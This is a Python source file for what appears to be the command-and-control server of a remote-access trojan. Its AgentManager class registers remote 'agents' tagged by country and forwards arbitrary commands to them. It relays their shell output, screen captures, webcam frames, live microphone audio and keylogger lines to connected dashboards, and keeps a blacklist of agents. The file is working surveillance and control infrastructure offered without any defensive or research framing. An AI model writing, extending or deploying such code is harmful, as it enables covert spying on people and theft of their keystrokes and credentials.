import json
from typing import Dict, Any, List, Set
from fastapi import WebSocket
import asyncio
import aiofiles
import os
import uuid

AGENTS_FILE = os.path.join(os.path.dirname(__file__), 'config', 'agents.json')
BLACKLIST_FILE = os.path.join(os.path.dirname(__file__), 'config', 'blacklist.json')

class AgentManager:
    def __init__(self) -> None:
        self.agents: Dict[str, Dict[str, Any]] = {}
        self.dashboards: Set[WebSocket] = set()
        self._lock = asyncio.Lock()
        self._pending_stats: Dict[str, asyncio.Future] = {}
        self._blacklist: Set[str] = set()
        # Ensure config dir/files exist
        os.makedirs(os.path.join(os.path.dirname(__file__), 'config'), exist_ok=True)
        if not os.path.exists(AGENTS_FILE):
            with open(AGENTS_FILE, 'w', encoding='utf-8') as f:
                json.dump([], f)
        if not os.path.exists(BLACKLIST_FILE):
            with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                json.dump([], f)
        else:
            try:
                with open(BLACKLIST_FILE, 'r', encoding='utf-8') as f:
                    self._blacklist = set(json.load(f) or [])
            except Exception:
                self._blacklist = set()
        # Load any previously persisted agents as offline entries
        try:
            with open(AGENTS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f) or []
            if isinstance(data, list):
                for entry in data:
                    try:
                        aid = entry.get('agent_id')
                        if not aid:
                            continue
                        self.agents[aid] = {
                            'socket': None,
                            'name': entry.get('name') or aid,
                            'alias': entry.get('alias') or None,
                            'http_base': entry.get('http_base'),
                            'has_camera': bool(entry.get('has_camera')),
                            'country': entry.get('country'),
                            'country_code': entry.get('country_code'),
                        }
                    except Exception:
                        continue
        except Exception:
            pass

    async def register_dashboard(self, ws: WebSocket) -> None:
        async with self._lock:
            self.dashboards.add(ws)
        await self.broadcast_agents()

    async def remove_dashboard(self, ws: WebSocket) -> None:
        async with self._lock:
            self.dashboards.discard(ws)

    async def register_agent(self, agent_id: str, name: str, http_base: str, ws: WebSocket, has_camera: bool = False, country: str | None = None, country_code: str | None = None) -> None:
        async with self._lock:
            prev = self.agents.get(agent_id, {})
            self.agents[agent_id] = {
                "socket": ws,
                "name": name or prev.get("name") or agent_id,
                "alias": prev.get("alias"),
                "http_base": http_base or prev.get("http_base"),
                "has_camera": bool(has_camera) if has_camera is not None else bool(prev.get("has_camera")),
                "country": country if country is not None else prev.get("country"),
                "country_code": country_code if country_code is not None else prev.get("country_code"),
            }
        await self.persist_agents()
        await self.broadcast_agents()

    async def remove_agent(self, agent_id: str) -> None:
        # Backwards-compat: full removal (used by explicit clear)
        async with self._lock:
            if agent_id in self.agents:
                self.agents.pop(agent_id, None)
        await self.persist_agents()
        await self.broadcast_agents()

    async def mark_offline(self, agent_id: str) -> None:
        async with self._lock:
            if agent_id in self.agents:
                try:
                    self.agents[agent_id]["socket"] = None
                except Exception:
                    self.agents[agent_id] = {k: v for k, v in self.agents[agent_id].items() if k != "socket"}
        await self.persist_agents()
        await self.broadcast_agents()

    async def clear_agent(self, agent_id: str) -> None:
        await self.remove_agent(agent_id)

    async def set_alias(self, agent_id: str, alias: str | None) -> None:
        async with self._lock:
            if agent_id not in self.agents:
                # create skeleton to persist alias even if not connected yet
                self.agents[agent_id] = {"socket": None, "name": agent_id, "alias": alias}
            else:
                self.agents[agent_id]["alias"] = (alias or None)
        await self.persist_agents()
        await self.broadcast_agents()

    async def force_disconnect_agent(self, agent_id: str) -> None:
        ws: WebSocket | None = None
        async with self._lock:
            entry = self.agents.get(agent_id)
            if entry:
                ws = entry.get("socket")
        try:
            if ws:
                await ws.close()
        except Exception:
            pass
        # Mark offline and broadcast (do not clear from registry)
        await self.mark_offline(agent_id)

    async def persist_agents(self) -> None:
        agents_list = await self.get_agents()
        async with aiofiles.open(AGENTS_FILE, 'w') as f:
            await f.write(json.dumps(agents_list, indent=2))

    async def get_agents(self) -> List[Dict[str, Any]]:
        async with self._lock:
            out: List[Dict[str, Any]] = []
            for aid, info in self.agents.items():
                try:
                    out.append({
                        "agent_id": aid,
                        "name": info.get("name"),
                        "alias": info.get("alias"),
                        "http_base": info.get("http_base"),
                        "has_camera": bool(info.get("has_camera")),
                        "country": info.get("country"),
                        "country_code": info.get("country_code"),
                        "online": bool(info.get("socket")),
                    })
                except Exception:
                    out.append({"agent_id": aid, "name": aid, "online": False})
            return out

    # Blacklist management
    async def is_blacklisted(self, agent_id: str) -> bool:
        async with self._lock:
            return agent_id in self._blacklist

    async def get_blacklist(self) -> List[str]:
        async with self._lock:
            return sorted(list(self._blacklist))

    async def add_blacklist(self, agent_id: str) -> None:
        async with self._lock:
            self._blacklist.add(agent_id)
            try:
                with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                    json.dump(sorted(list(self._blacklist)), f, indent=2)
            except Exception:
                pass

    async def remove_blacklist(self, agent_id: str) -> None:
        async with self._lock:
            self._blacklist.discard(agent_id)
            try:
                with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                    json.dump(sorted(list(self._blacklist)), f, indent=2)
            except Exception:
                pass

    async def broadcast_agents(self) -> None:
        payload = {"type": "agents", "agents": await self.get_agents()}
        await self._broadcast_to_dashboards(payload)

    async def _broadcast_to_dashboards(self, payload: Dict[str, Any]) -> None:
        stale: List[WebSocket] = []
        for ws in list(self.dashboards):
            try:
                await ws.send_json(payload)
            except Exception:
                stale.append(ws)
        for ws in stale:
            await self.remove_dashboard(ws)

    async def forward_command(self, agent_id: str, command: str) -> bool:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return False
        try:
            await ws.send_json({"command": command})
            return True
        except Exception:
            return False

    async def forward_json(self, agent_id: str, payload: Dict[str, Any]) -> bool:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return False
        try:
            await ws.send_json(payload)
            return True
        except Exception:
            return False

    async def request_stats(self, agent_id: str, session_id: str | None = None) -> Dict[str, Any]:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return {"error": "Agent not connected"}
        req_id = str(uuid.uuid4())
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending_stats[req_id] = fut
        try:
            payload = {"type": "stats_request", "request_id": req_id}
            if isinstance(session_id, str) and session_id:
                payload["session_id"] = session_id
            await ws.send_json(payload)
        except Exception as e:
            self._pending_stats.pop(req_id, None)
            return {"error": f"Failed to send request: {e}"}
        try:
            data = await asyncio.wait_for(fut, timeout=10.0)
            return data if isinstance(data, dict) else {"data": data}
        except asyncio.TimeoutError:
            self._pending_stats.pop(req_id, None)
            return {"error": "Timed out waiting for stats"}

    async def complete_stats_request(self, request_id: str, payload: Dict[str, Any]) -> None:
        fut = self._pending_stats.pop(request_id, None)
        if fut and not fut.done():
            fut.set_result(payload)

    async def relay_output_to_dashboards(self, agent_id: str, output: str) -> None:
        await self._broadcast_to_dashboards({"type": "log", "agent_id": agent_id, "line": output})

    async def relay_exit_to_dashboards(self, agent_id: str, code: int) -> None:
        await self._broadcast_to_dashboards({"type": "exit", "agent_id": agent_id, "exit_code": code})

    async def relay_screen_to_dashboards(self, agent_id: str, frame: Dict[str, Any]) -> None:
        payload = {"type": "screen_frame", "agent_id": agent_id, **frame}
        await self._broadcast_to_dashboards(payload)

    async def relay_camera_to_dashboards(self, agent_id: str, frame: Dict[str, Any]) -> None:
        payload = {"type": "camera_frame", "agent_id": str(agent_id), **frame}
        await self._broadcast_to_dashboards(payload)

    async def relay_audio_live_to_dashboards(self, agent_id: str, payload: Dict[str, Any]) -> None:
        data = {"type": "audio_live", "agent_id": str(agent_id)}
        try:
            data.update(payload or {})
        except Exception:
            pass
        await self._broadcast_to_dashboards(data)

    async def relay_keylog_to_dashboards(self, agent_id: str, line: str) -> None:
        payload = {"type": "keylog_line", "agent_id": str(agent_id), "line": line}
        await self._broadcast_to_dashboards(payload)

    async def get_agent_http_base(self, agent_id: str) -> str | None:
        async with self._lock:
            entry = self.agents.get(agent_id)
            return entry.get("http_base") if entry else None

manager = AgentManager()
